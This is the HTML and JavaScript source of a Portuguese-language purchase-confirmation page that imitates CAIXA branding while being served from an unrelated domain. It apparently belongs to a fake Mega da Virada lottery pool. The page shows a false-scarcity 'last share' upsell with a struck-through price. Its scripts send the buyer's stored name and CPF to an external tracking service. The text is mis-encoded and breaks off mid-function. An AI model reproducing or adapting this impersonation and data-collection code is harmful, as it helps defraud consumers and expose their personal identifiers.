<!DOCTYPE html><html lang="pt-br"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta http-equiv="X-Content-Type-Options" content="nosniff">
    <meta http-equiv="X-Frame-Options" content="DENY">
    <meta http-equiv="Referrer-Policy" content="strict-origin-when-cross-origin">
    <title>Obrigado - CAIXA</title>
    
    <!-- Preload recursos cr√≠ticos -->
    <link rel="preconnect" href="https://loteria.programaoficial.is">
    <link rel="dns-prefetch" href="https://loteria.programaoficial.is">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" media="print" onload="this.media='all'">
    <noscript><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet"></noscript>
    
    <!-- CSS cr√≠tico inline para renderiza√ß√£o imediata -->
    <style>
        body{margin:0;padding:0;font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background-color:#f8f9fa;padding-top:120px;min-height:100vh}
        .header{background:linear-gradient(135deg,#005da8 0%,#004a8a 100%);padding:15px 20px;text-align:center;display:flex;align-items:center;justify-content:center;position:fixed;top:0;left:0;width:100%;height:120px;z-index:1000;box-shadow:0 4px 12px rgba(0,0,0,0.08)}
        .logo{max-width:700px;height:auto;display:flex;align-items:center;justify-content:center}
        .logo img{width:100%;height:auto;display:block;max-height:200px;object-fit:contain;filter:drop-shadow(0 2px 4px rgba(0,0,0,0.2))}
        .container{max-width:680px;width:100%;background-color:#fff;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.08);overflow:hidden;margin:0 auto}
    </style>
    
    <!-- UTM Capture Script -->
    <script>
        // Captura os UTMs assim que a p√°gina carregar
        (function() {
            const urlParams = new URLSearchParams(window.location.search);
            const utmKeys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'src', 'sck'];
            const utmParams = {};
            const utmData = {};
            let hasUtms = false;
            
            utmKeys.forEach(key => {
                const value = urlParams.get(key);
                // Sanitizar valor para prevenir XSS
                if (value) {
                    const sanitized = String(value).replace(/[<>\"']/g, '').substring(0, 200);
                    if (sanitized) {
                        utmParams[key] = sanitized;
                        utmData[key] = sanitized;
                        hasUtms = true;
                    } else {
                        utmParams[key] = null;
                    }
                } else {
                    utmParams[key] = null;
                }
            });
            
            // Se tem UTMs na URL, salvar no localStorage em ambos os formatos
            if (hasUtms) {
                localStorage.setItem('utmParams', JSON.stringify(utmParams));
                // Tamb√©m salvar no formato utm_data (UTMify) com timestamp
                utmData.createdAt = new Date().getTime();
                    localStorage.setItem('utm_data', JSON.stringify(utmData));
                    if (window.DEBUG) console.log('[UTM] UTMs capturados da URL:', utmParams);
            } else {
                // Se n√£o tem na URL, verificar se tem no localStorage e manter
                try {
                    const storedParams = localStorage.getItem('utmParams');
                    const storedData = localStorage.getItem('utm_data');
                    if (window.DEBUG) {
                        if (storedParams) {
                            console.log('[UTM] UTMs mantidos do localStorage (utmParams):', JSON.parse(storedParams));
                        }
                        if (storedData) {
                            console.log('[UTM] UTMs mantidos do localStorage (utm_data):', JSON.parse(storedData));
                        }
                    }
                } catch (e) {
                    console.warn('[UTM] Erro ao verificar localStorage:', e);
                }
            }
        })();
    </script>
    
    <style>
        :root {
            /* Cores principais */
            --cor-primaria: #005da8;
            --cor-primaria-escura: #004a8a;
            --cor-primaria-clara: #0066b8;
            --cor-secundaria: #f39200;
            --cor-sucesso: #2e7d32;
            --cor-sucesso-clara: #4CAF50;
            --cor-sucesso-fundo: #e8f5e9;
            --cor-texto: #212529;
            --cor-texto-secundario: #6c757d;
            --cor-fundo: #f8f9fa;
            --cor-branco: #ffffff;
            
            /* Espa√ßamentos padronizados */
            --espaco-xs: 5px;
            --espaco-sm: 10px;
            --espaco-md: 15px;
            --espaco-lg: 20px;
            --espaco-xl: 25px;
            --espaco-2xl: 30px;
            --espaco-3xl: 35px;
            --espaco-4xl: 40px;
            
            /* Bordas */
            --raio-sm: 10px;
            --raio-md: 12px;
            
            /* Sombras */
            --sombra-sm: 0 2px 8px rgba(0, 0, 0, 0.04);
            --sombra-md: 0 4px 12px rgba(0, 0, 0, 0.08);
            --sombra-lg: 0 4px 20px rgba(0, 0, 0, 0.08);
            
            /* Cores para upsell */
            --cor-urgente: #dc3545;
            --cor-urgente-clara: #f8d7da;
            --cor-destaque: #ff6b35;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background-color: var(--cor-fundo);
            padding: 0;
            margin: 0;
            min-height: 100vh;
            padding-top: 120px;
            padding-bottom: var(--espaco-4xl);
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            line-height: 1.5;
        }

        .container {
            max-width: 680px;
            width: 100%;
            background-color: var(--cor-branco);
            border-radius: var(--raio-md);
            box-shadow: var(--sombra-lg);
            overflow: hidden;
            margin: 0 auto;
        }

        /* Cabe√ßalho CAIXA */
        .header {
            background: linear-gradient(135deg, var(--cor-primaria) 0%, var(--cor-primaria-escura) 100%);
            padding: 15px var(--espaco-lg);
            text-align: center;
            display: flex;
            align-items: center;
            justify-content: center;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 120px;
            z-index: 1000;
            box-shadow: var(--sombra-md);
        }

        .logo {
            max-width: 700px;
            height: auto;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .logo img {
            width: 100%;
            height: auto;
            display: block;
            max-height: 200px;
            object-fit: contain;
            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.2));
        }

        /* Se√ß√£o Principal */
        .main-section {
            padding: var(--espaco-4xl) var(--espaco-3xl);
        }

        /* √çcone de Sucesso */
        .success-icon {
            width: 100px;
            height: 100px;
            margin: 0 auto var(--espaco-2xl);
            background: linear-gradient(135deg, var(--cor-sucesso-clara) 0%, var(--cor-sucesso) 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 20px rgba(76, 175, 80, 0.3);
            animation: scaleIn 0.5s ease-out;
            will-change: transform;
        }

        .success-icon::before {
            content: '‚úì';
            color: white;
            font-size: 60px;
            font-weight: bold;
            line-height: 1;
        }

        @keyframes scaleIn {
            0% {
                transform: scale(0);
                opacity: 0;
            }
            50% {
                transform: scale(1.1);
            }
            100% {
                transform: scale(1);
                opacity: 1;
            }
        }

        /* T√≠tulo Principal */
        .titulo-principal {
            color: var(--cor-sucesso);
            font-size: 32px;
            font-weight: 800;
            margin: 0 0 var(--espaco-md) 0;
            text-align: center;
            letter-spacing: -0.5px;
            line-height: 1.2;
        }

        .subtitulo {
            color: var(--cor-texto-secundario);
            font-size: 18px;
            margin-bottom: var(--espaco-3xl);
            text-align: center;
            font-weight: 400;
            line-height: 1.5;
        }

        /* Box de Confirma√ß√£o */
        .confirmacao-box {
            background: linear-gradient(135deg, var(--cor-sucesso-fundo) 0%, #c8e6c9 100%);
            border: 2px solid var(--cor-sucesso-clara);
            border-radius: var(--raio-sm);
            padding: var(--espaco-2xl);
            margin: var(--espaco-3xl) 0;
            text-align: center;
            box-shadow: 0 2px 12px rgba(76, 175, 80, 0.15);
        }

        .confirmacao-text {
            color: #1b5e20;
            font-weight: 700;
            font-size: 20px;
            letter-spacing: -0.2px;
            margin-bottom: var(--espaco-sm);
        }

        .confirmacao-subtext {
            color: var(--cor-sucesso);
            font-size: 16px;
            font-weight: 500;
            margin-top: var(--espaco-sm);
        }

        /* Informa√ß√µes do Pedido */
        .info-pedido {
            background-color: var(--cor-fundo);
            border-radius: var(--raio-sm);
            padding: var(--espaco-xl);
            margin: var(--espaco-2xl) 0;
            box-shadow: var(--sombra-sm);
        }

        .info-pedido h3 {
            color: var(--cor-primaria);
            font-size: 19px;
            margin-bottom: var(--espaco-lg);
            font-weight: 700;
            letter-spacing: -0.2px;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: var(--espaco-md);
            padding: var(--espaco-sm) 0;
            border-bottom: 1px solid #e9ecef;
        }

        .info-row:last-child {
            margin-bottom: 0;
            border-bottom: none;
        }

        .info-row .label {
            color: var(--cor-texto-secundario);
            font-size: 14px;
            font-weight: 500;
        }

        .info-row .value {
            color: var(--cor-texto);
            font-size: 15px;
            font-weight: 600;
        }

        /* Mensagem Final */
        .mensagem-final {
            text-align: center;
            color: var(--cor-texto);
            font-size: 16px;
            font-weight: 500;
            margin: var(--espaco-3xl) 0 var(--espaco-2xl) 0;
            line-height: 1.6;
            padding: var(--espaco-xl);
            background-color: #fff3cd;
            border-left: 4px solid var(--cor-secundaria);
            border-radius: var(--raio-sm);
        }

        @keyframes shimmer {
            0%, 100% {
                background-position: 0% 50%;
            }
            50% {
                background-position: 100% 50%;
            }
        }

        /* Link de Ajuda */
        .help-link {
            text-align: center;
            margin-top: var(--espaco-sm);
            padding-bottom: var(--espaco-sm);
        }

        .help-link a {
            color: var(--cor-primaria);
            text-decoration: underline;
            font-size: 14px;
            transition: all 0.2s ease;
        }

        .help-link a:hover {
            color: var(--cor-primaria-escura);
        }

        /* Se√ß√£o de Upsell */
        .upsell-section {
            background: linear-gradient(135deg, #fff5f5 0%, #ffe5e5 100%);
            border: 3px solid var(--cor-urgente);
            border-radius: var(--raio-md);
            padding: var(--espaco-2xl);
            margin: var(--espaco-3xl) 0;
            text-align: center;
            box-shadow: 0 4px 20px rgba(220, 53, 69, 0.2);
            position: relative;
            overflow: hidden;
        }

        .upsell-section::before {
            content: '‚ö°';
            position: absolute;
            top: 10px;
            right: 10px;
            font-size: 30px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% {
                transform: scale(1);
                opacity: 1;
            }
            50% {
                transform: scale(1.1);
                opacity: 0.8;
            }
        }

        .upsell-badge {
            display: inline-block;
            background: var(--cor-urgente);
            color: white;
            padding: var(--espaco-xs) var(--espaco-md);
            border-radius: 20px;
            font-size: 12px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: var(--espaco-md);
        }

        .upsell-title {
            color: var(--cor-urgente);
            font-size: 24px;
            font-weight: 800;
            margin-bottom: var(--espaco-sm);
            line-height: 1.2;
        }

        .upsell-subtitle {
            color: var(--cor-texto);
            font-size: 18px;
            font-weight: 600;
            margin-bottom: var(--espaco-lg);
        }

        .upsell-info {
            background: white;
            border-radius: var(--raio-sm);
            padding: var(--espaco-lg);
            margin: var(--espaco-lg) 0;
            box-shadow: var(--sombra-sm);
        }

        .upsell-info-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: var(--espaco-md);
            padding-bottom: var(--espaco-sm);
            border-bottom: 1px solid #e9ecef;
        }

        .upsell-info-row:last-child {
            margin-bottom: 0;
            border-bottom: none;
        }

        .upsell-info-label {
            color: var(--cor-texto-secundario);
            font-size: 14px;
            font-weight: 500;
        }

        .upsell-info-value {
            color: var(--cor-texto);
            font-size: 16px;
            font-weight: 700;
        }

        .upsell-price {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: var(--espaco-md);
            margin: var(--espaco-lg) 0;
        }

        .upsell-price-old {
            color: var(--cor-texto-secundario);
            font-size: 20px;
            text-decoration: line-through;
            font-weight: 500;
        }

        .upsell-price-new {
            color: var(--cor-urgente);
            font-size: 32px;
            font-weight: 800;
        }

        .upsell-dezenas {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 8px;
            margin: var(--espaco-lg) 0;
        }

        .upsell-dezena {
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, var(--cor-primaria) 0%, var(--cor-primaria-escura) 100%);
            color: white;
            border-radius: 50%;
            font-size: 14px;
            font-weight: 600;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
            animation: dezenaFloat 3s ease-in-out infinite, dezenaPulse 2s ease-in-out infinite;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            position: relative;
            overflow: hidden;
            will-change: transform;
        }

        .upsell-dezena::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.3) 0%, transparent 70%);
            animation: dezenaShine 2s ease-in-out infinite;
        }

        .upsell-dezena:nth-child(1) { animation-delay: 0s; }
        .upsell-dezena:nth-child(2) { animation-delay: 0.1s; }
        .upsell-dezena:nth-child(3) { animation-delay: 0.2s; }
        .upsell-dezena:nth-child(4) { animation-delay: 0.3s; }
        .upsell-dezena:nth-child(5) { animation-delay: 0.4s; }
        .upsell-dezena:nth-child(6) { animation-delay: 0.5s; }
        .upsell-dezena:nth-child(7) { animation-delay: 0.6s; }
        .upsell-dezena:nth-child(8) { animation-delay: 0.7s; }
        .upsell-dezena:nth-child(9) { animation-delay: 0.8s; }
        .upsell-dezena:nth-child(10) { animation-delay: 0.9s; }
        .upsell-dezena:nth-child(11) { animation-delay: 1s; }
        .upsell-dezena:nth-child(12) { animation-delay: 1.1s; }
        .upsell-dezena:nth-child(13) { animation-delay: 1.2s; }
        .upsell-dezena:nth-child(14) { animation-delay: 1.3s; }
        .upsell-dezena:nth-child(15) { animation-delay: 1.4s; }
        .upsell-dezena:nth-child(16) { animation-delay: 1.5s; }
        .upsell-dezena:nth-child(17) { animation-delay: 1.6s; }
        .upsell-dezena:nth-child(18) { animation-delay: 1.7s; }
        .upsell-dezena:nth-child(19) { animation-delay: 1.8s; }
        .upsell-dezena:nth-child(20) { animation-delay: 1.9s; }

        .upsell-dezena:hover {
            transform: scale(1.2) rotate(360deg);
            box-shadow: 0 4px 20px rgba(0, 93, 168, 0.5);
            z-index: 10;
        }

        @keyframes dezenaFloat {
            0%, 100% {
                transform: translateY(0) rotate(0deg);
            }
            25% {
                transform: translateY(-8px) rotate(5deg);
            }
            50% {
                transform: translateY(-12px) rotate(0deg);
            }
            75% {
                transform: translateY(-8px) rotate(-5deg);
            }
        }

        @keyframes dezenaShine {
            0% {
                transform: rotate(0deg) translateX(-100%);
                opacity: 0;
            }
            50% {
                opacity: 1;
            }
            100% {
                transform: rotate(180deg) translateX(100%);
                opacity: 0;
            }
        }

        @keyframes dezenaPulse {
            0%, 100% {
                box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15), 0 0 0 0 rgba(0, 93, 168, 0.4);
            }
            50% {
                box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15), 0 0 0 8px rgba(0, 93, 168, 0);
            }
        }

        .upsell-button {
            background: linear-gradient(135deg, var(--cor-destaque) 0%, #ff4500 100%);
            color: white;
            border: none;
            padding: var(--espaco-lg) var(--espaco-2xl);
            border-radius: 50px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            margin-top: var(--espaco-lg);
            box-shadow: 0 4px 15px rgba(255, 107, 53, 0.4);
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .upsell-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(255, 107, 53, 0.5);
        }

        .upsell-button:active {
            transform: translateY(0);
        }

        @media (max-width: 600px) {
            .upsell-section {
                padding: var(--espaco-xl);
            }

            .upsell-title {
                font-size: 20px;
            }

            .upsell-subtitle {
                font-size: 16px;
            }

            .upsell-price-new {
                font-size: 28px;
            }

            .upsell-price-old {
                font-size: 18px;
            }

            .upsell-dezena {
                width: 35px;
                height: 35px;
                font-size: 12px;
            }

            .upsell-button {
                font-size: 16px;
                padding: var(--espaco-md) var(--espaco-xl);
            }
        }

        /* Responsivo */
        @media (max-width: 600px) {
            body {
                padding-top: 110px;
                padding-bottom: var(--espaco-2xl);
            }

            .header {
                padding: 10px var(--espaco-md);
                height: 110px;
            }

            .logo {
                max-width: 500px;
            }

            .logo img {
                max-height: 160px;
            }

            .main-section {
                padding: var(--espaco-2xl) var(--espaco-lg);
            }

            .success-icon {
                width: 80px;
                height: 80px;
                margin-bottom: var(--espaco-xl);
            }

            .success-icon::before {
                font-size: 50px;
            }

            .titulo-principal {
                font-size: 26px;
                margin-bottom: var(--espaco-sm);
            }

            .subtitulo {
                font-size: 16px;
                margin-bottom: var(--espaco-2xl);
            }

            .confirmacao-box {
                padding: var(--espaco-xl);
                margin: var(--espaco-2xl) 0;
            }

            .confirmacao-text {
                font-size: 18px;
            }

            .confirmacao-subtext {
                font-size: 15px;
            }

            .info-pedido {
                padding: var(--espaco-lg);
            }

            .info-pedido h3 {
                font-size: 17px;
                margin-bottom: var(--espaco-md);
            }

            .info-row {
                flex-direction: column;
                align-items: flex-start;
                gap: var(--espaco-xs);
            }

            .info-row .label {
                font-size: 13px;
            }

            .info-row .value {
                font-size: 14px;
            }

            .mensagem-final {
                font-size: 15px;
                padding: var(--espaco-lg);
                margin: var(--espaco-2xl) 0 var(--espaco-lg) 0;
            }
        }

        @media (max-width: 400px) {
            .main-section {
                padding: var(--espaco-xl) var(--espaco-md);
            }

            .success-icon {
                width: 70px;
                height: 70px;
            }

            .success-icon::before {
                font-size: 45px;
            }

            .titulo-principal {
                font-size: 22px;
            }

            .subtitulo {
                font-size: 15px;
            }

            .confirmacao-box {
                padding: var(--espaco-lg);
            }

            .confirmacao-text {
                font-size: 16px;
            }

            .confirmacao-subtext {
                font-size: 14px;
            }

            .info-pedido {
                padding: var(--espaco-md);
            }

            .info-pedido h3 {
                font-size: 16px;
            }

            .mensagem-final {
                font-size: 14px;
                padding: var(--espaco-md);
            }
        }
    </style>
    
    <!-- UTMify UTMs Script - Carregado de forma ass√≠ncrona -->
    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" defer=""></script>

    <!-- UTMify Tracking Script (Inline) -->
    <script>
        (function (window) {
            'use strict';
            const CONFIG = {
                STORAGE_KEY: 'utm_data',
                STORAGE_TTL_DAYS: 7,
                getPixelId: function () {
                    try {
                        const storedPixelId = localStorage.getItem('utmify_pixel_id');
                        if (storedPixelId) return storedPixelId;
                    } catch (e) {}
                    if (window.pixelId) return window.pixelId;
                    return '693235534e24ea4b926a9a07';
                },
                API_URL: 'https://tracking.utmify.com.br/tracking/v1/events'
            };
            function captureUtms() {
                const urlParams = new URLSearchParams(window.location.search);
                const utmKeys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'src', 'sck'];
                let newUtmData = {};
                let hasUtms = false;
                utmKeys.forEach(key => {
                    if (urlParams.has(key)) {
                        const value = urlParams.get(key);
                        if (value) {
                            const sanitized = String(value).replace(/[<>\"']/g, '').substring(0, 200);
                            if (sanitized) {
                                newUtmData[key] = sanitized;
                                hasUtms = true;
                            }
                        }
                    }
                });
                if (hasUtms) {
                    newUtmData.createdAt = new Date().getTime();
                    localStorage.setItem(CONFIG.STORAGE_KEY, JSON.stringify(newUtmData));
                    if (window.DEBUG) console.log('[UTMify] UTMs captured from URL:', newUtmData);
                }
            }
            window.getUtmData = function () {
                try {
                    const stored = localStorage.getItem(CONFIG.STORAGE_KEY);
                    if (stored) {
                        const data = JSON.parse(stored);
                        const { createdAt, ...utms } = data;
                        return utms;
                    }
                } catch (e) { }
                return {};
            };
            window.sendUtmifyEvent = async function (eventType, extra = {}) {
                const pixelId = CONFIG.getPixelId();
                const utmData = window.getUtmData();
                const lead = {
                    pixelId: pixelId,
                    ip: null,
                    email: extra.email || null,
                    name: extra.name || null,
                    phone: extra.phone || null
                };
                function mapEventType(type) {
                    if (type === 'Purchase') return 'sale';
                    if (type === 'Lead') return 'lead_prospect';
                    return type.toLowerCase();
                }
                const event = {
                    type: mapEventType(eventType),
                    pageTitle: extra.pageTitle || document.title,
                    sourceUrl: window.location.href,
                    value: extra.value || null,
                    status: extra.status || null,
                    payment_method: extra.payment_method || null,
                    external_id: extra.external_id || null,
                    gateway_transaction_id: extra.transaction_id || null,
                    metadata: {
                        ...utmData,
                        ...(extra.metadata || {})
                    }
                };
                const payload = {
                    type: eventType,
                    lead: lead,
                    event: event
                };
                if (window.DEBUG) console.log(`[UTMify] Sending event: ${eventType}`, payload);
                try {
                    const response = await fetch(CONFIG.API_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    if (window.DEBUG) console.log('[UTMify] Event sent response:', response.status);
                } catch (error) {
                    console.error('[UTMify] Error sending event:', error);
                }
            };
            captureUtms();
            // Enviar evento Purchase quando a p√°gina obrigado carregar
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', function() {
                    setTimeout(function() {
                        if (window.sendUtmifyEvent) {
                            try {
                                const nome = String(localStorage.getItem('nome') || '').substring(0, 100).replace(/[<>\"']/g, '');
                                const cpf = String(localStorage.getItem('cpf') || '').replace(/[^0-9]/g, '').substring(0, 11);
                                const urlParams = new URLSearchParams(window.location.search);
                                const valorStr = urlParams.get('valor') || '0';
                                const valor = Math.max(0, Math.min(parseFloat(valorStr) || 0, 999999.99));
                                
                                window.sendUtmifyEvent('Purchase', {
                                    pageTitle: 'Obrigado - Compra Confirmada',
                                    value: valor,
                                    status: 'completed',
                                    name: nome || null,
                                    metadata: { cpf: cpf || null }
                                });
                            } catch (e) {
                                console.error('[UTMify] Erro ao enviar evento Purchase:', e);
                            }
                        }
                    }, 500);
                });
            } else {
                setTimeout(function() {
                    if (window.sendUtmifyEvent) {
                        try {
                            const nome = String(localStorage.getItem('nome') || '').substring(0, 100).replace(/[<>\"']/g, '');
                            const cpf = String(localStorage.getItem('cpf') || '').replace(/[^0-9]/g, '').substring(0, 11);
                            const urlParams = new URLSearchParams(window.location.search);
                            const valorStr = urlParams.get('valor') || '0';
                            const valor = Math.max(0, Math.min(parseFloat(valorStr) || 0, 999999.99));
                            
                            window.sendUtmifyEvent('Purchase', {
                                pageTitle: 'Obrigado - Compra Confirmada',
                                value: valor,
                                status: 'completed',
                                name: nome || null,
                                metadata: { cpf: cpf || null }
                            });
                        } catch (e) {
                            console.error('[UTMify] Erro ao enviar evento Purchase:', e);
                        }
                    }
                }, 500);
            }
        })(window);
    </script>
</head>
<body>
    <div class="container">
        <!-- Cabe√ßalho CAIXA -->
        <div class="header">
            <div class="logo">
                <img id="logoImg" src="images/caixx.png" alt="CAIXA" loading="eager" fetchpriority="high">
            </div>
        </div>

        <!-- Se√ß√£o Principal -->
        <div class="main-section">
            <!-- √çcone de Sucesso -->
            <div class="success-icon"></div>

            <!-- T√≠tulo Principal -->
            <h1 class="titulo-principal">OBRIGADO PELA SUA COMPRA!</h1>
            <p class="subtitulo">
                Seu pagamento foi confirmado com sucesso
            </p>

            <!-- Box de Confirma√ß√£o -->
            <div class="confirmacao-box">
                <div class="confirmacao-text">PAGAMENTO CONFIRMADO</div>
                <div class="confirmacao-subtext">Seus bilhetes est√£o garantidos!</div>
            </div>

            <!-- Informa√ß√µes do Pedido -->
            <div class="info-pedido">
                <h3>Informa√ß√µes do Pedido</h3>
                <div class="info-row" id="rowNome" style="display: none;">
                    <span class="label">Nome:</span>
                    <span class="value" id="nomeCliente"></span>
                </div>
                <div class="info-row" id="rowCpf" style="display: none;">
                    <span class="label">CPF:</span>
                    <span class="value" id="cpfCliente"></span>
                </div>
                <div class="info-row">
                    <span class="label">N√∫mero do Concurso:</span>
                    <span class="value" id="numeroConcurso">2955</span>
                </div>
                <div class="info-row">
                    <span class="label">Data do Sorteio:</span>
                    <span class="value" id="dataSorteio">31/12/2025</span>
                </div>
                <div class="info-row">
                    <span class="label">Data da Compra:</span>
                    <span class="value" id="dataCompra"></span>
                </div>
            </div>

            <!-- Mensagem Final -->
            <div class="mensagem-final">
                <strong>Parab√©ns!</strong> Sua participa√ß√£o no bol√£o Mega da Virada foi confirmada. 
                Boa sorte no sorteio!
            </div>

            <!-- Informa√ß√£o sobre Entrega -->
            <div class="mensagem-final">
                <strong>üì¶ Informa√ß√£o Importante:</strong> Em at√© 72 horas os bilhetes est√£o sendo emitidos e ser√£o entregues no seu n√∫mero de WhatsApp cadastrado. Fique atento √†s mensagens!
            </div>

            <!-- Oferta de Upsell -->
            <div class="upsell-section">
                <div class="upsell-badge">√öltima Vaga</div>
                <h2 class="upsell-title">BOL√ÉO SECRETO - √öLTIMA COTA!</h2>
                <p class="upsell-subtitle">20 Dezenas - Valor Promocional</p>
                
                <div class="upsell-info">
                    <div class="upsell-info-row">
                        <span class="upsell-info-label">Composi√ß√£o:</span>
                        <span class="upsell-info-value">1 Jogo com 20 Dezenas</span>
                    </div>
                    <div class="upsell-info-row">
                        <span class="upsell-info-label">Cotas Dispon√≠veis:</span>
                        <span class="upsell-info-value" style="color: var(--cor-urgente);">√öLTIMA COTA</span>
                    </div>
                    <div class="upsell-info-row">
                        <span class="upsell-info-label">Sorteio:</span>
                        <span class="upsell-info-value">31/12/2025</span>
                    </div>
                </div>

                <div class="upsell-dezenas">
                    <span class="upsell-dezena">02</span>
                    <span class="upsell-dezena">05</span>
                    <span class="upsell-dezena">08</span>
                    <span class="upsell-dezena">11</span>
                    <span class="upsell-dezena">14</span>
                    <span class="upsell-dezena">17</span>
                    <span class="upsell-dezena">20</span>
                    <span class="upsell-dezena">23</span>
                    <span class="upsell-dezena">26</span>
                    <span class="upsell-dezena">29</span>
                    <span class="upsell-dezena">32</span>
                    <span class="upsell-dezena">35</span>
                    <span class="upsell-dezena">38</span>
                    <span class="upsell-dezena">41</span>
                    <span class="upsell-dezena">44</span>
                    <span class="upsell-dezena">47</span>
                    <span class="upsell-dezena">50</span>
                    <span class="upsell-dezena">53</span>
                    <span class="upsell-dezena">56</span>
                    <span class="upsell-dezena">59</span>
                </div>

                <div class="upsell-price">
                    <span class="upsell-price-old">R$ 129,90</span>
                    <span class="upsell-price-new">R$ 68,90</span>
                </div>

                <button class="upsell-button" id="upsellButton">
                    Garantir √öltima Cota Agora
                </button>
            </div>

            <!-- Link de Ajuda -->
            <div class="help-link">
                <a href="#" onclick="mostrarAjuda(); return false;">Precisa de ajuda?</a>
            </div>
        </div>
    </div>

    <script>
        'use strict';

        /**
         * Utilit√°rios de formata√ß√£o
         */
        const Formatadores = {
            /**
             * Formata valor em moeda brasileira
             * @param {string|number} valor - Valor a ser formatado
             * @returns {string} Valor formatado como R$ X,XX
             */
            moeda(valor) {
                if (!valor) return 'R$ 0,00';
                const num = parseFloat(valor);
                if (isNaN(num)) return 'R$ 0,00';
                return num.toLocaleString('pt-BR', { 
                    style: 'currency', 
                    currency: 'BRL' 
                });
            },

            /**
             * Formata CPF com m√°scara
             * @param {string} cpf - CPF a ser formatado
             * @returns {string} CPF formatado ou placeholder
             */
            cpf(cpf) {
                if (!cpf) return '_________________';
                // Sanitizar entrada
                const cpfSanitizado = String(cpf).replace(/[^0-9]/g, '');
                const cpfLimpo = cpfSanitizado.replace(/\D/g, '');
                if (cpfLimpo.length !== 11) return '_________________';
                return cpfLimpo.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
            },

            /**
             * Formata data no formato brasileiro
             * @param {string|Date} data - Data a ser formatada
             * @returns {string} Data formatada como DD/MM/AAAA
             */
            data(data) {
                if (!data) return '';
                try {
                    const date = data instanceof Date ? data : new Date(data);
                    if (isNaN(date.getTime())) return '';
                    return date.toLocaleDateString('pt-BR', {
                        day: '2-digit',
                        month: '2-digit',
                        year: 'numeric'
                    });
                } catch (e) {
                    return '';
                }
            },

            /**
             * Formata data e hora no formato brasileiro
             * @param {string|Date} data - Data e hora a serem formatadas
             * @returns {string} Data e hora formatadas
             */
            dataHora(data) {
                try {
                    const date = data ? (data instanceof Date ? data : new Date(data)) : new Date();
                    if (isNaN(date.getTime())) {
                        return new Date().toLocaleString('pt-BR', {
                            day: '2-digit',
                            month: '2-digit',
                            year: 'numeric',
                            hour: '2-digit',
                            minute: '2-digit'
                        });
                    }
                    return date.toLocaleString('pt-BR', {
                        day: '2-digit',
                        month: '2-digit',
                        year: 'numeric',
                        hour: '2-digit',
                        minute: '2-digit'
                    });
                } catch (e) {
                    return new Date().toLocaleString('pt-BR', {
                        day: '2-digit',
                        month: '2-digit',
                        year: 'numeric',
                        hour: '2-digit',
                        minute: '2-digit'
                    });
                }
            }
        };

        /**
         * Gerenciador de dados do localStorage
         */
        const StorageManager = {
            /**
             * Busca valor do localStorage com fallback
             * @param {string} chave - Chave do localStorage
             * @param {string} fallback - Valor padr√£o
             * @returns {string} Valor encontrado ou fallback
             */
            get(chave, fallback = '') {
                try {
                    return localStorage.getItem(chave) || fallback;
                } catch (e) {
                    console.warn(`Erro ao acessar localStorage: ${e.message}`);
                    return fallback;
                }
            },

            /**
             * Busca m√∫ltiplas chaves com fallbacks
             * @param {Object} chaves - Objeto com chaves e fallbacks
             * @returns {Object} Objeto com valores encontrados
             */
            getMultiple(chaves) {
                const resultado = {};
                for (const [chave, fallback] of Object.entries(chaves)) {
                    resultado[chave] = this.get(chave, fallback);
                }
                return resultado;
            }
        };

        /**
         * Gerenciador de elementos DOM
         */
        const DOMManager = {
            /**
             * Atualiza conte√∫do de elemento de forma segura
             * @param {string} id - ID do elemento
             * @param {string} conteudo - Conte√∫do a ser inserido
             */
            atualizar(id, conteudo) {
                const elemento = document.getElementById(id);
                if (elemento) {
                    // Usar textContent ao inv√©s de innerHTML para prevenir XSS
                    elemento.textContent = String(conteudo || '');
                } else {
                    console.warn(`Elemento com ID "${id}" n√£o encontrado`);
                }
            },

            /**
             * Atualiza m√∫ltiplos elementos
             * @param {Object} elementos - Objeto com IDs e conte√∫dos
             */
            atualizarMultiplos(elementos) {
